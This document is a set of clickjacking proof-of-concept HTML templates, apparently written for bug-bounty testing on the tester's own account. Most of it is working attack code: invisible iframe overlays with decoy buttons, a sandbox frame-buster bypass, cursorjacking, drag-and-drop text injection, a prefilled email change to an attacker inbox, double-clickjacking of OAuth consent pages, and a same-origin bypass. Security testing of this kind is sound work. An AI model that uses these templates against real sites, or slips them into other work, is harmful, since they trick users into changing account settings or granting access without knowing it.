# Clickjacking PoC Templates

Serve from `localhost` (`python -m http.server 8000`) or your own domain. Open in your own victim browser profile, logged in to your own account. Replace `TARGET_URL`. Use the opacity slider to align the decoy, then set opacity to near zero for the demo video.

## 1. Basic frame test

```html
<html><head><title>Clickjack test page</title></head><body>
<p>The page is frameable if the frame below is not blank.</p>
<iframe src="TARGET_URL" width="900" height="600"></iframe>
</body></html>
```

## 2. Transparent overlay with alignment controls

```html
<html><head><style>
  #target { position: relative; width: 1000px; height: 700px; opacity: 0.5; z-index: 2; border: 0; }
  #decoy  { position: absolute; top: 300px; left: 400px; z-index: 1;
            padding: 12px 24px; background: #2a7; color: #fff; font: 18px sans-serif; }
</style></head><body>
<div>
  opacity <input type="range" min="0" max="1" step="0.05" value="0.5"
    oninput="document.getElementById('target').style.opacity=this.value">
  top <input type="number" value="300" oninput="decoy.style.top=this.value+'px'">
  left <input type="number" value="400" oninput="decoy.style.left=this.value+'px'">
</div>
<div id="decoy">Click to claim your prize</div>
<iframe id="target" src="TARGET_URL"></iframe>
</body></html>
```

The iframe is above the decoy (`z-index: 2`) but transparent, so the click goes to the framed button under the decoy text.

## 3. Frame-buster bypass with sandbox

```html
<iframe id="target" src="TARGET_URL" width="1000" height="700"
  sandbox="allow-forms allow-scripts allow-same-origin"
  style="opacity:0.5"></iframe>
```

Without `allow-top-navigation`, `top.location = self.location` fails. Try also without `allow-scripts` when the page works without JavaScript.

## 4. Multi-step (move decoy between clicks)

```html
<style>
  #target { position: relative; width: 1000px; height: 700px; opacity: 0.0001; z-index: 2; border: 0; }
  .decoy  { position: absolute; z-index: 1; padding: 12px 24px; background: #c33; color: #fff; }
</style>
<div class="decoy" id="d1" style="top:300px;left:400px">Step 1: Start</div>
<div class="decoy" id="d2" style="top:420px;left:520px;display:none">Step 2: Continue</div>
<iframe id="target" src="TARGET_URL"></iframe>
<script>
  // The iframe takes the click, so watch for focus leaving the page to advance the decoy.
  let step = 0;
  window.addEventListener("blur", () => {
    setTimeout(() => {
      if (step === 0) { d1.style.display = "none"; d2.style.display = "block"; step = 1; }
      window.focus();
    }, 300);
  });
</script>
```

## 5. Cursorjacking (hidden real cursor, fake cursor offset)

```html
<style>
  body { cursor: none; }
  #fake { position: fixed; width: 16px; height: 16px; pointer-events: none; z-index: 9;
          background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><path d="M0 0 L0 14 L4 10 L7 16 L9 15 L6 9 L11 9 Z"/></svg>'); }
  #target { position: absolute; top: 0; left: 0; width: 1000px; height: 700px; opacity: 0.0001; border: 0; }
</style>
<img id="fake">
<div style="position:absolute;top:300px;left:700px">Click here</div>
<iframe id="target" src="TARGET_URL"></iframe>
<script>
  const OFFSET_X = 300; // fake cursor drawn 300px right of the real one
  document.addEventListener("mousemove", e => {
    fake.style.left = (e.clientX + OFFSET_X) + "px"; fake.style.top = e.clientY + "px";
  });
</script>
```

Note: the real cursor over a cross-origin iframe shows the iframe's cursor style, so this works best where the framed page does not override the cursor.

## 6. Drag and drop

```html
<p>Drag the ball into the basket</p>
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','ATTACKER_TEXT')"
     style="width:40px;height:40px;border-radius:50%;background:orange"></div>
<!-- Framed input positioned under the "basket" receives the dropped text -->
<iframe src="TARGET_URL" style="position:absolute;top:200px;left:300px;width:800px;height:500px;opacity:0.0001"></iframe>
```

For exfiltration (dragging text out of the frame into an attacker drop zone), many browsers block or sanitise cross-origin drag data. Record the browser.

## 7. Prefilled form via URL parameters

```html
<iframe src="https://TARGET/settings/email?new_email=own-attacker-inbox%40example.test"
        style="opacity:0.0001;position:absolute;top:0;left:0;width:1000px;height:700px"></iframe>
<div style="position:absolute;top:340px;left:420px">Click to continue</div>
```

## 8. Double-clickjacking (no frame needed)

```html
<button id="go">Double-click to verify you are human</button>
<script>
go.onclick = () => {
  // Opens a helper popup that asks for a double-click.
  const w = window.open("helper.html", "helper", "width=400,height=300");
};
</script>
```

`helper.html` (same origin as the PoC):

```html
<button ondblclick="">Double-click here</button>
<script>
  // On mousedown of the first click, navigate the opener to the sensitive page and close this popup,
  // so the second click of the double-click lands on the target's button in the opener window.
  document.addEventListener("mousedown", () => {
    window.opener.location = "TARGET_URL";   // for example an own-client OAuth consent page
    setTimeout(() => window.close(), 50);
  });
</script>
```

Align the target button with the popup's button position. Works regardless of XFO and frame-ancestors; mitigated by delaying button activation on newly focused pages.

## 9. Same-origin gadget (SAMEORIGIN bypass, chain)

If you can host HTML on the target origin (own upload, user page, preview), host this there and frame the sensitive page from it:

```html
<iframe src="/settings/danger" style="opacity:0.0001;position:absolute;width:1000px;height:700px"></iframe>
<div style="position:absolute;top:300px;left:400px">Click me</div>
```

Authorized-only: needs content hosting or XSS on the target origin.

## Evidence

PoC HTML, browser name and version, a screen recording showing the decoy and the completed action on your own victim account, the response headers of the framed page, and the session cookie SameSite value.
